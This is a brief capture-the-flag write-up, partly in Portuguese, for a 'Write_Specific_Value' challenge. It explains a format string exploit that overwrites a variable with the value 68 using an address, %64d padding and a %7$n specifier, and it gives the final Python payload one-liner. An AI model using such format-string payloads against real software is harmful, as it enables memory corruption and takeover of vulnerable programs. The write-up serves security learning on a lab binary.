# Challenge `Write_Specific_Value` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Format Strings
- Where: Where is the vulnerability present
  -  Buffer
- Impact: What results of exploiting this vulnerability
  - Modificar o valor de uma variavel
## Steps to reproduce

1. address onde queremos escrever \x40\xa0\x04\x08

2. %7$n o nr de caracteres que foram escritos - foram escritos 4

3. %64d - 64 + 4 para obter o 68

Payload final: python -c 'print "\x40\xa0\x04\x08" +"%64d"+  "%7$n"'
